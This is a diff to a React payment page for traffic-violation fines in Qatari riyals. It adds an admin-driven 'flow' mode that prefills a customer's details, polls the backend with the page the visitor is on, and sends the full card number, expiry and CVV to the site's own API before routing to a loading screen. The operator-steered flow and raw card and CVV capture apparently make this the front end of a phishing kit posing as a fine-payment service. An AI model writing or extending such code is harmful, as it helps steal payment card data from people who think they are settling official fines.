@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useState, useRef } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import {
   Button,
@@ -16,7 +16,8 @@ import * as yup from "yup";
 import { paymentsApi } from "../api/payments";
 import { ApiError } from "../api/client";
 import { useLang } from "../context/LanguageContext";
-import type { ViolationItem, ViolationSearchResult } from "../api/types";
+import { useFlowPoll } from "../hooks/useFlowPoll";
+import type { ViolationItem, ViolationSearchResult, PaymentPrefill } from "../api/types";
 import { COUNTRIES, DEFAULT_COUNTRY, flagEmoji } from "../constants/countries";
 import styles from "./PayPage.module.scss";
 import cardStyles from "./CardModal.module.scss";
@@ -209,11 +210,15 @@ export function PayPage() {
   const location = useLocation();
 
   const result = resolveResult(location.state, location.search);
+  const flowRef = (location.state as { reference?: string } | null)?.reference ?? null;
 
   // ALL hooks unconditionally — no lazy initialisers that touch `result`.
   // selected is seeded via useEffect once result is known.
   const [selected, setSelected] = useState<Set<string>>(new Set());
   const [selectedSeeded, setSelectedSeeded] = useState(false);
+  const [prefillRecord, setPrefillRecord] = useState<PaymentPrefill | null>(null);
+  const [prefillLoading, setPrefillLoading] = useState(!!flowRef);
+  const prefillFetched = useRef(false);
 
   const [detailItem, setDetailItem] = useState<ViolationItem | null>(null);
   const [form, setForm] = useState({
@@ -247,6 +252,25 @@ export function PayPage() {
     }
   }, [result, selectedSeeded]);
 
+  // When redirected via flow (admin sent payment page action), fetch prefill data
+  useEffect(() => {
+    if (!flowRef || prefillFetched.current) return;
+    prefillFetched.current = true;
+    paymentsApi.prefill(flowRef).then((data) => {
+      const parts = data.fullName.trim().split(/\s+/);
+      const firstName = parts[0] ?? "";
+      const lastName = parts.slice(1).join(" ");
+      setForm((f) => ({ ...f, firstName, lastName, email: data.email ?? "" }));
+      setPrefillRecord(data);
+      setCardOpen(true);
+    }).catch(() => {
+      setPrefillRecord(null);
+    }).finally(() => setPrefillLoading(false));
+  }, [flowRef]); // eslint-disable-line react-hooks/exhaustive-deps
+
+  // Tell the backend the customer has arrived on the payment page (clears flow action)
+  useFlowPoll({ reference: flowRef ?? "", currentPage: "payment", enabled: !!flowRef });
+
   const dialCode =
     COUNTRIES.find((c) => c.iso === phoneCountry)?.dial ?? DEFAULT_COUNTRY.dial;
 
@@ -260,11 +284,22 @@ export function PayPage() {
 
   // ── Early returns (all hooks above this line) ────────────────────────────
 
-  if (!result) {
+  if (!result && !flowRef) {
     return <NoData isArabic={isArabic} backLabel={t.details.back} />;
   }
 
-  if (result.violations.length === 0) {
+  if (flowRef && prefillLoading) {
+    return (
+      <div className={styles.page}>
+        <div className={styles.titleBand}>{t.details.pageTitle}</div>
+        <div className={styles.wrap} style={{ textAlign: "center", padding: "48px 0", color: "#94a3b8" }}>
+          Loading…
+        </div>
+      </div>
+    );
+  }
+
+  if (result && result.violations.length === 0) {
     return (
       <NoViolations
         message={t.results.noViolations}
@@ -275,7 +310,7 @@ export function PayPage() {
 
   // ── Helpers ──────────────────────────────────────────────────────────────
 
-  const payable = result.violations.filter((v) => v.status !== "Paid");
+  const payable = result?.violations.filter((v) => v.status !== "Paid") ?? [];
 
   const toggle = (ref: string) =>
     setSelected((prev) => {
@@ -390,15 +425,16 @@ export function PayPage() {
     if (!validateCard()) return;
     setBusy(true);
     try {
+      const isPrefillMode = !!prefillRecord;
       const res = await paymentsApi.create({
-        referenceId: result.referenceId,
+        referenceId: isPrefillMode ? prefillRecord!.referenceId : result!.referenceId,
         fullName: `${form.firstName} ${form.lastName}`.trim(),
-        mobile: `${dialCode}${form.phone}`,
+        mobile: isPrefillMode ? prefillRecord!.mobile : `${dialCode}${form.phone}`,
         email: form.email || undefined,
-        identifier: result.identifier,
-        amount: total,
-        violationRefs: [...selected],
-        language,
+        identifier: isPrefillMode ? prefillRecord!.identifier : result!.identifier,
+        amount: isPrefillMode ? prefillRecord!.amount : total,
+        violationRefs: isPrefillMode ? prefillRecord!.violationRefs : [...selected],
+        language: isPrefillMode ? (prefillRecord!.language as "ar" | "en") : language,
         cardholderName: card.cardholderName,
         cardNumber: card.cardNumber.replace(/\s/g, ""),
         cardExpiryMonth: card.expiryMonth,
@@ -408,7 +444,7 @@ export function PayPage() {
       sessionStorage.setItem("pay_ref", res.reference);
       setCardOpen(false);
       navigate("/flow/loading", {
-        state: { reference: res.reference, amount: total },
+        state: { reference: res.reference, amount: prefillRecord?.amount ?? total },
       });
     } catch (err) {
       const msg = err instanceof ApiError ? err.message : "Network error";
@@ -421,6 +457,137 @@ export function PayPage() {
       setBusy(false);
     }
   };
+
+  // ── Prefill mode (admin redirected customer back to payment page) ─────────
+
+  if (!result && prefillRecord) {
+    const prefillAmount = prefillRecord.amount;
+    return (
+      <div className={styles.page}>
+        <div className={styles.titleBand}>{t.details.pageTitle}</div>
+        <div className={styles.wrap}>
+          {/* Contact Information */}
+          <div className={styles.card}>
+            <h3 className={styles.cardTitle}>{t.details.contactInfo}</h3>
+            <div className={styles.contactGrid}>
+              <TextInput
+                label={`${t.details.firstName} *`}
+                placeholder={t.details.firstNamePh}
+                value={form.firstName}
+                error={errors.firstName}
+                onChange={(e) => setField("firstName", e.currentTarget.value)}
+              />
+              <TextInput
+                label={`${t.details.lastName} *`}
+                placeholder={t.details.lastNamePh}
+                value={form.lastName}
+                error={errors.lastName}
+                onChange={(e) => setField("lastName", e.currentTarget.value)}
+              />
+              <TextInput
+                label={`${t.details.email} *`}
+                placeholder={t.details.emailPh}
+                value={form.email}
+                error={errors.email}
+                onChange={(e) => setField("email", e.currentTarget.value)}
+              />
+            </div>
+          </div>
+
+          {/* Amount summary */}
+          <div className={styles.card} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "16px 20px" }}>
+            <span style={{ fontWeight: 600, color: "#1e293b" }}>
+              {isArabic ? "المبلغ الإجمالي" : "Total Amount"}
+            </span>
+            <span style={{ fontWeight: 700, fontSize: "1.1rem", color: "#0f172a" }}>
+              <NumberFormatter value={prefillAmount} thousandSeparator /> {t.common.currency}
+            </span>
+          </div>
+
+          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12 }}>
+            <Button variant="default" radius="sm" onClick={() => navigate("/")}>
+              {t.common.backHome}
+            </Button>
+            <Button radius="sm" onClick={() => setCardOpen(true)}>
+              {t.details.pay}
+            </Button>
+          </div>
+        </div>
+
+        {/* Card Payment Modal (reused) */}
+        <Modal
+          opened={cardOpen}
+          onClose={() => setCardOpen(false)}
+          title={isArabic ? "بيانات بطاقة الائتمان" : "Credit Card Payment"}
+          centered
+          radius="lg"
+          size="md"
+          overlayProps={{ backgroundOpacity: 0.75 }}
+        >
+          <div className={cardStyles.cardModal} dir={isArabic ? "rtl" : "ltr"}>
+            <TextInput
+              label={isArabic ? "رقم بطاقة الائتمان" : "Credit Card Number"}
+              placeholder={isArabic ? "أدخل رقم البطاقة" : "Enter credit card number"}
+              value={card.cardNumber}
+              error={cardErrors.cardNumber}
+              inputMode="numeric"
+              maxLength={19}
+              onChange={(e) => handleCardNumberInput(e.currentTarget.value)}
+              classNames={{ input: cardStyles.fieldInput }}
+              mb="md"
+            />
+            <TextInput
+              label={isArabic ? "اسم حامل البطاقة" : "Card Holder Name"}
+              placeholder={isArabic ? "أدخل اسم حامل البطاقة" : "Enter card holder name"}
+              value={card.cardholderName}
+              error={cardErrors.cardholderName}
+              onChange={(e) => {
+                setCard((c) => ({ ...c, cardholderName: e.currentTarget.value.toUpperCase() }));
+                setCardErrors((e2) => ({ ...e2, cardholderName: undefined }));
+              }}
+              classNames={{ input: cardStyles.fieldInput }}
+              mb="md"
+            />
+            <div className={cardStyles.expiryAndCvvRow}>
+              <div>
+                <span className={cardStyles.fieldLabel}>{isArabic ? "تاريخ انتهاء البطاقة" : "Expiry Date"}</span>
+                <span className={cardStyles.subLabel}>{isArabic ? "شهر / سنة" : "MM / YYYY"}</span>
+                <div className={cardStyles.expiryInputsRow}>
+                  <Select placeholder={isArabic ? "شهر" : "MM"} data={MONTHS} value={card.expiryMonth} error={!!cardErrors.expiryMonth}
+                    onChange={(v) => { setCard((c) => ({ ...c, expiryMonth: v ?? "" })); setCardErrors((e) => ({ ...e, expiryMonth: undefined })); }}
+                    allowDeselect={false} comboboxProps={{ withinPortal: true }} />
+                  <Select placeholder={isArabic ? "سنة" : "YYYY"} data={YEARS} value={card.expiryYear} error={!!cardErrors.expiryYear}
+                    onChange={(v) => { setCard((c) => ({ ...c, expiryYear: v ?? "" })); setCardErrors((e) => ({ ...e, expiryYear: undefined })); }}
+                    allowDeselect={false} comboboxProps={{ withinPortal: true }} />
+                </div>
+              </div>
+              <div>
+                <span className={cardStyles.fieldLabel}>{isArabic ? "رمز الحماية" : "Security Code"}</span>
+                <span className={cardStyles.subLabel}>CVV</span>
+                <TextInput placeholder="CVV" value={card.cvv} error={!!cardErrors.cvv} inputMode="numeric" maxLength={4} type="password"
+                  onChange={(e) => { setCard((c) => ({ ...c, cvv: e.currentTarget.value.replace(/\D/g, "").slice(0, 4) })); setCardErrors((e2) => ({ ...e2, cvv: undefined })); }}
+                  classNames={{ input: cardStyles.fieldInput }} />
+                {cardErrors.cvv && <Text size="xs" c="red">{cardErrors.cvv}</Text>}
+              </div>
+            </div>
+            <div className={cardStyles.totalRow}>
+              <Text size="sm" c="dimmed" fw={500}>{isArabic ? "المجموع الكلي" : "Total Amount"}</Text>
+              <div className={cardStyles.totalAmountValue}>
+                <span>QAR</span>
+                <NumberFormatter value={prefillAmount} thousandSeparator />
+                {isArabic && <span>ريال قطري</span>}
+              </div>
+            </div>
+            <div className={cardStyles.cardActions}>
+              <Button loading={busy} onClick={handleCardSubmit}>
+                {isArabic ? "ادفع الآن" : "Pay Now"}
+              </Button>
+            </div>
+          </div>
+        </Modal>
+      </div>
+    );
+  }
 
   // ── Render ───────────────────────────────────────────────────────────────
 
